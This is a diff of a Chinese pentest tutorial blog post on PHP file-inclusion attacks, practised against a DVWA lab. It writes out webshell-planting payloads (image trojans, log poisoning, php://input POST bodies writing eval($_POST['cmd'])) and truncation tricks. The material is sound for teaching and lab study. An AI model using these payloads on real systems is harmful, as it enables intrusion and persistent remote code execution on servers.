@@ -8,6 +8,8 @@ topics = ["Pentest"]
 
 +++
 
+环境：phpStudy 2016、DVWA v1.10
+
 ### 0x00 文件包含
 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
 
@@ -54,21 +56,8 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 > 上AWVS或者自己写代码测试
 
 ### 0x06 本地包含GetShell
-* 示例一
 
-```php
-<?php
-    if (@$_GET['page']) {  
-        include($_GET['page']);
-    } else {  
-        include "show.php";
-    }
-?>
-```
-![文件包含-上传图片马](/img/post/file_include_upload1.png)
-![文件包含-验证能包含图片马](/img/post/file_include_upload1_check.png)
-
-* 示例二
+* 简单代码示例
 
 ```php
 <?php
@@ -82,42 +71,22 @@ include_once()和require_once()：若文件中代码已被包含则不会再次�
 ![文件包含-上传图片马](/img/post/file_include_upload2.png)
 ![文件包含-验证能包含图片马](/img/post/file_include_upload2_check.png)
 
-* %00截断包含(PHP<5.3.4 and magic_quotes_gpc=off)
-
-```php
-<?php
-    if (@$_GET['page']) {
-        include "./action/".$_GET['page'].".php";
-        echo "./action/".$_GET['page'].".php";
-    } else {
-        include "./action/show.php";
-    }
-?>
-```
-![文件包含-上传图片马](/img/post/file_include_upload3.png)
-![文件包含-验证能包含图片马](/img/post/file_include_upload3_check.png)
-还有一个路径长度截断，Linux可以用./或/截断，需要文件名长度大于4096，Windows可以  
-用\\.或./或\或/截断，需要大于256，是否能成功截断有多方面原因，可以说是靠运气的
-
 * 包含图片马写shell
-
-```
-上传图片马，马包含的代码为<?fputs(fopen("shell.php","w"),"<?php eval(\$_POST['cmd']);?>")?>，
-上传后图片路径为/uploadfile/201643.jpg，当访问
-http://localhost/dvwa/vulnerabilities/fi/?page=../../uploadfile/201643.jpg时，
-将会在fi这个文件夹下生成shell.php,内容为<?php eval($_POST[xxser]);?>
-```
+    * 生成包含```<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST['cmd']);?>")?>```的图片马
+    * 上传后图片路径为../../hackable/uploads/aa.png
+    * 访问```http://10.11.11.20/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/aa.png```
+    * 在fi这个文件夹下会看到生成shell.php,内容为```<?php eval($_POST['cmd']);?>```
 
 * 包含日志GetShell(主要是得到日志的路径)
 
-```
-读日志路径：
+```ini
+在Linux下一般读日志路径：
 文件包含漏洞读取apache配置文件
 index.php?page=/etc/init.d/httpd
 index.php?page=/etc/httpd/conf/httpd.conf
 默认位置/var/log/httpd/access_log
 ```
-> 日志会记录客户端请求及服务器响应的信息，访问```http://www.xx.com/<?php phpinfo(); ?>```时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent
+日志会记录客户端请求及服务器响应的信息，访问```http://www.xx.com/<?php phpinfo(); ?>```时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent
 ![文件包含-包含日志](/img/post/file_include_access.log1.png)
 可以通过Burp Suite来绕过编码
 ![文件包含-包含日志](/img/post/file_include_access.log2.png)
@@ -125,28 +94,35 @@ index.php?page=/etc/httpd/conf/httpd.conf
 ![文件包含-包含日志](/img/post/file_include_access.log3.png)
 ![文件包含-包含日志](/img/post/file_include_access.log4.png)
 
-* 包含环境变量文件GetShell
-
-```
-需要PHP运行在CGI模式
-然后和包含日志一样，在User-Agent修改为payload
-```
-
 * 使用PHP封装协议GetShell
 
 ```
-allow_url_include=On时,若执行http://www.xxx.com/index.php?page=php://input,并且提
-交数据<?php fputs(fopen("shell.php","w"),"<?php eval($_POST['cmd']);?>") ?>
+allow_url_include=On时：
+
+http://www.xxx.com/index.php?page=php://input
+POST:<?php fputs(fopen("shell.php","w"),"<?php eval(\$_POST['cmd']);?>") ?>
+
 结果将在index.php所在文件下生成一句话文件shell.php
 ```
-![文件包含-用PHP封装协议写shell1](/img/post/file_include_enprotocol1.png)
-![文件包含-用PHP封装协议写shell2](/img/post/file_include_enprotocol2.png)
+
+* %00截断包含(PHP<5.3.4 and magic_quotes_gpc=Off，CVE-2006-7243)
+
+![文件包含-上传图片马](/img/post/file_include_upload3.png)
+
+还有一个路径长度截断，可以用.或/.或./截断，Windows需要259个bytes，Linux需要4096个bytes
 
 * phpinfo包含临时文件GetShell
 
 ```
 向phpinfo上传文件则可以返回文件路径，但是文件存在时间很短，
 可以用程序持续上传，然后就可以包含你上传的文件了
+```
+
+* 包含环境变量文件GetShell
+
+```
+需要PHP运行在CGI模式
+然后和包含日志一样，在User-Agent修改为payload
 ```
 
 ### 0x07 本地包含读文件
